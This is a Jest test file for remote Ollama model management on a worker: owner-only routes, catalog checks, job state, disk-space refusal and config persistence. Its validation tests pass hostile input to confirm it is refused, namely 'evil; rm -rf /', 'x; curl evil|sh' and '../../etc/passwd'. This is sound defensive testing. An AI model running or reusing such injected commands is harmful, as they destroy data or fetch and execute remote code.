// 1.2.0 remote model management: the owner installs/removes Ollama models on
// their worker from the panel. Covers the REST routes (owner + catalog
// checks), the server job state, the worker's ModelManager (validation, disk
// check, config persistence, refusals) and Ollama pull-progress parsing.

const express = require('express');
const request = require('supertest');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { EventEmitter } = require('events');

jest.mock('../src/database/pool', () => {
  const state = { queryImpl: async () => ({ rows: [] }) };
  return {
    __state: state,
    query: (sql, params) => state.queryImpl(sql, params),
    connect: async () => { throw new Error('connectImpl not scripted'); },
  };
});
jest.mock('axios', () => ({ post: jest.fn(), get: jest.fn(), delete: jest.fn() }));

const pool = require('../src/database/pool');
const axios = require('axios');
const WSServer = require('../src/ws');
const workerRoutes = require('../src/routes/workers');
const OllamaService = require('../../worker-app/src/services/ollama');
const { ModelManager, MODEL_RE } = require('../../worker-app/src/services/manager');

const SECRET = process.env.JWT_SECRET;
const sign = (id) => jwt.sign({ id, role: 'user', token_version: 0 }, SECRET, { algorithm: 'HS256', expiresIn: '1h' });

function makeWs(workers = []) {
  const ws = Object.create(WSServer.prototype);
  ws.workers = new Map();
  ws.taskCallbacks = new Map();
  for (const w of workers) ws.workers.set(w.id, { models: [], modelHealth: {}, status: 'online', ...w });
  return ws;
}

function socket() {
  const sent = [];
  return { sent, readyState: 1, send: (s) => sent.push(JSON.parse(s)) };
}

function buildApp(wsServer, { ownerId = 7 } = {}) {
  pool.__state.queryImpl = async (sql, params) => {
    if (String(sql).includes('token_version')) return { rows: [{ token_version: 0, banned: false }] };
    if (String(sql).includes('FROM workers') && String(sql).includes('user_id = $2')) {
      return params[1] === ownerId && params[0] === 9
        ? { rows: [{ id: 9, ram: '16 GB', models: ['llama3.1:8b', 'bge-m3'] }] }
        : { rows: [] };
    }
    return { rows: [] };
  };
  const app = express();
  app.use(express.json());
  app.set('wsServer', wsServer);
  app.use('/api/workers', workerRoutes);
  return app;
}

describe('panel routes', () => {
  test('GET shows installed models, catalog, manage state', async () => {
    const ws = makeWs([{ id: 9, ws: socket(), manage: 'on', models: ['llama3.1:8b', 'bge-m3'] }]);
    const res = await request(buildApp(ws)).get('/api/workers/mine/9/models').set('Authorization', `Bearer ${sign(7)}`);
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ online: true, manage: 'on', installed: ['llama3.1:8b', 'bge-m3'], job: null });
    expect(res.body.catalog.find((m) => m.id === 'llama3.3:70b').size_gb).toBe(43);
  });

  test('only the owner can manage the worker', async () => {
    const ws = makeWs([{ id: 9, ws: socket(), manage: 'on' }]);
    const res = await request(buildApp(ws)).post('/api/workers/mine/9/models')
      .set('Authorization', `Bearer ${sign(8)}`).send({ model: 'phi4:14b' });
    expect(res.status).toBe(404);
    expect(ws.workers.get(9).ws.sent).toHaveLength(0);
  });

  test('install sends one narrow manage frame; second request is busy', async () => {
    const sock = socket();
    const ws = makeWs([{ id: 9, ws: sock, manage: 'on' }]);
    const app = buildApp(ws);
    const res = await request(app).post('/api/workers/mine/9/models')
      .set('Authorization', `Bearer ${sign(7)}`).send({ model: 'phi4:14b' });
    expect(res.status).toBe(202);
    expect(sock.sent).toEqual([{ type: 'manage', id: res.body.job.id, action: 'pull', model: 'phi4:14b', size_gb: 9 }]);
    const again = await request(app).post('/api/workers/mine/9/models')
      .set('Authorization', `Bearer ${sign(7)}`).send({ model: 'llama3.2:3b' });
    expect(again.status).toBe(409);
    expect(again.body.code).toBe('MANAGE_BUSY');
  });

  test('rejects models outside the catalog and protects bge-m3', async () => {
    const ws = makeWs([{ id: 9, ws: socket(), manage: 'on', models: ['llama3.1:8b', 'bge-m3'] }]);
    const app = buildApp(ws);
    const bad = await request(app).post('/api/workers/mine/9/models')
      .set('Authorization', `Bearer ${sign(7)}`).send({ model: 'evil; rm -rf /' });
    expect(bad.status).toBe(400);
    const req = await request(app).delete('/api/workers/mine/9/models/bge-m3').set('Authorization', `Bearer ${sign(7)}`);
    expect(req.status).toBe(400);
    expect(req.body.code).toBe('MODEL_REQUIRED');
  });

  test('old worker → unsupported, disabled → 403, offline → 409', async () => {
    const auth = { Authorization: `Bearer ${sign(7)}` };
    const post = (ws) => request(buildApp(ws)).post('/api/workers/mine/9/models').set(auth).send({ model: 'phi4:14b' });
    expect((await post(makeWs([{ id: 9, ws: socket(), manage: null }]))).body.code).toBe('MANAGE_UNSUPPORTED');
    expect((await post(makeWs([{ id: 9, ws: socket(), manage: 'off' }]))).status).toBe(403);
    expect((await post(makeWs([]))).status).toBe(409);
  });
});

describe('auth records the manage capability', () => {
  const auth = async (manage) => {
    pool.__state.queryImpl = async (sql) => (String(sql).includes('FROM workers WHERE worker_token')
      ? { rows: [{ id: 9, status: 'offline', gpu_model: null, ram: null }] }
      : { rows: [] });
    const ws = makeWs();
    ws.authFails = new Map();
    const sock = { _clientIp: '203.0.113.9', sent: [], send(m) { this.sent.push(JSON.parse(m)); }, close() {} };
    const msg = { type: 'auth', worker_token: 'pw_' + 'a'.repeat(64), protocol: 4 };
    if (manage !== undefined) msg.manage = manage;
    await ws.handleAuth(sock, msg);
    expect(sock.sent[0].type).toBe('auth_ok');
    return ws.workers.get(9).manage;
  };
  test('true → on, false → off, missing → unsupported', async () => {
    expect(await auth(true)).toBe('on');
    expect(await auth(false)).toBe('off');
    expect(await auth(undefined)).toBe(null);
    expect(await auth('yes')).toBe(null);
  });
});

describe('server job state', () => {
  test('progress and result update the job and the served models', async () => {
    const sock = socket();
    const ws = makeWs([{ id: 9, ws: sock, manage: 'on', models: ['llama3.1:8b'] }]);
    pool.__state.queryImpl = async () => ({ rows: [] });
    const { job } = ws.startManage(9, 'pull', 'phi4:14b', 9);
    ws.handleManageProgress(sock, { type: 'manage_progress', id: job.id, status: 'pulling abc', completed: 50, total: 200 });
    expect(ws.getManageJob(9)).toMatchObject({ status: 'running', completed: 50, total: 200 });
    ws.handleManageProgress(sock, { id: 'someone-else', completed: 999, total: 999 });
    expect(ws.getManageJob(9).completed).toBe(50);
    await ws.handleManageResult(sock, { id: job.id, ok: true, models: ['llama3.1:8b', 'phi4:14b'] });
    expect(ws.getManageJob(9)).toMatchObject({ status: 'done', completed: 200 });
    expect(ws.workers.get(9).models).toEqual(['llama3.1:8b', 'phi4:14b']);
  });

  test('failure text is sanitized; disconnect interrupts a running job', async () => {
    const sock = socket();
    const ws = makeWs([{ id: 9, ws: sock, manage: 'on' }]);
    const { job } = ws.startManage(9, 'pull', 'phi4:14b');
    await ws.handleManageResult(sock, { id: job.id, ok: false, error: '<b>disk\nfull</b>' });
    expect(ws.getManageJob(9).error).toBe('b disk full /b');
    ws.startManage(9, 'pull', 'phi4:14b');
    ws.interruptManageJob(9);
    expect(ws.getManageJob(9)).toMatchObject({ status: 'failed', error: 'Worker disconnected during the operation' });
  });
});

describe('worker ModelManager', () => {
  let dir; let cfgPath;
  const writeCfg = (extra = {}) => fs.writeFileSync(cfgPath, JSON.stringify({
    models: 'llama3.1:8b,bge-m3', default_model: 'llama3.1:8b', worker_token: 'pw_x', ...extra,
  }));
  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pk-mgr-'));
    cfgPath = path.join(dir, 'config.json');
    writeCfg();
    delete process.env.PLANKTON_REMOTE_MANAGE;
  });
  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

  const run = async (mgr, msg) => {
    const frames = [];
    await mgr.handle({ id: 'j1', ...msg }, (f) => frames.push(f));
    return frames;
  };
  const fakeOllama = () => ({
    pullModel: jest.fn(async (model, onProgress) => { onProgress({ status: 'pulling', completed: 5, total: 10 }); }),
    deleteModel: jest.fn(async () => {}),
  });

  test('pull persists the model and reports the new list', async () => {
    const ollama = fakeOllama();
    const onModels = jest.fn();
    const mgr = new ModelManager({ ollama, configPath: cfgPath, onModels, freeBytes: () => 100 * 1024 ** 3 });
    const frames = await run(mgr, { action: 'pull', model: 'phi4:14b', size_gb: 9 });
    expect(frames.map((f) => f.type)).toEqual(['manage_progress', 'manage_result']);
    expect(frames[1]).toMatchObject({ ok: true, models: ['llama3.1:8b', 'bge-m3', 'phi4:14b'] });
    expect(JSON.parse(fs.readFileSync(cfgPath, 'utf8')).models).toBe('llama3.1:8b,bge-m3,phi4:14b');
    expect(onModels).toHaveBeenCalledWith(['llama3.1:8b', 'bge-m3', 'phi4:14b']);
  });

  test('refuses when the disk is too small, before downloading', async () => {
    const ollama = fakeOllama();
    const mgr = new ModelManager({ ollama, configPath: cfgPath, freeBytes: () => 20 * 1024 ** 3 });
    const frames = await run(mgr, { action: 'pull', model: 'llama3.3:70b', size_gb: 43 });
    expect(frames[0]).toMatchObject({ ok: false });
    expect(frames[0].error).toMatch(/Not enough disk space/);
    expect(ollama.pullModel).not.toHaveBeenCalled();
  });

  test('remove: keeps bge-m3 and the last chat model, else deletes and persists', async () => {
    const ollama = fakeOllama();
    const mgr = new ModelManager({ ollama, configPath: cfgPath });
    expect((await run(mgr, { action: 'remove', model: 'bge-m3' }))[0].error).toMatch(/required/);
    expect((await run(mgr, { action: 'remove', model: 'llama3.1:8b' }))[0].error).toMatch(/last chat model/);
    writeCfg({ models: 'llama3.1:8b,phi4:14b,bge-m3' });
    const frames = await run(mgr, { action: 'remove', model: 'llama3.1:8b' });
    expect(frames[0]).toMatchObject({ ok: true, models: ['phi4:14b', 'bge-m3'] });
    const cfg = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
    expect(cfg.default_model).toBe('phi4:14b');
    expect(ollama.deleteModel).toHaveBeenCalledWith('llama3.1:8b');
  });

  test('owner switch-off, bad names, unknown actions and parallel jobs are refused', async () => {
    const ollama = fakeOllama();
    writeCfg({ remote_manage: false });
    const off = new ModelManager({ ollama, configPath: cfgPath });
    expect(off.enabled()).toBe(false);
    expect((await run(off, { action: 'pull', model: 'phi4:14b' }))[0].error).toMatch(/turned off/);
    writeCfg();
    const mgr = new ModelManager({ ollama, configPath: cfgPath });
    expect((await run(mgr, { action: 'pull', model: 'x; curl evil|sh' }))[0].error).toBe('Invalid model name');
    expect((await run(mgr, { action: 'exec', model: 'phi4:14b' }))[0].error).toBe('Unknown action');
    mgr.job = { action: 'pull', model: 'qwen3:32b' };
    expect((await run(mgr, { action: 'pull', model: 'phi4:14b' }))[0].error).toMatch(/Busy/);
    expect(ollama.pullModel).not.toHaveBeenCalled();
    expect(MODEL_RE.test('qwen2.5-coder:32b')).toBe(true);
    expect(MODEL_RE.test('../../etc/passwd')).toBe(false);
  });
});

describe('Ollama pull progress', () => {
  test('sums layer sizes across digests and resolves on success', async () => {
    const stream = new EventEmitter();
    axios.post.mockReset();
    axios.post.mockResolvedValue({ data: stream });
    const seen = [];
    const done = new OllamaService('m').pullModel('phi4:14b', (p) => seen.push(p));
    await Promise.resolve();
    await Promise.resolve();
    stream.emit('data', Buffer.from('{"status":"pulling manifest"}\n{"status":"pulling a","digest":"a","total":100,"completed":40}\n'));
    stream.emit('data', Buffer.from('{"status":"pulling b","digest":"b","total":300,"completed":300}\n{"status":"success"}\n'));
    await done;
    expect(seen[seen.length - 1]).toMatchObject({ completed: 340, total: 400 });
    expect(axios.post.mock.calls[0][1]).toEqual({ model: 'phi4:14b', stream: true });
  });

  test('rejects on an Ollama error line', async () => {
    const stream = new EventEmitter();
    axios.post.mockReset();
    axios.post.mockResolvedValue({ data: stream });
    const done = new OllamaService('m').pullModel('nope:1b');
    await Promise.resolve();
    await Promise.resolve();
    stream.emit('data', Buffer.from('{"error":"pull model manifest: file does not exist"}\n'));
    await expect(done).rejects.toThrow('file does not exist');
  });
});
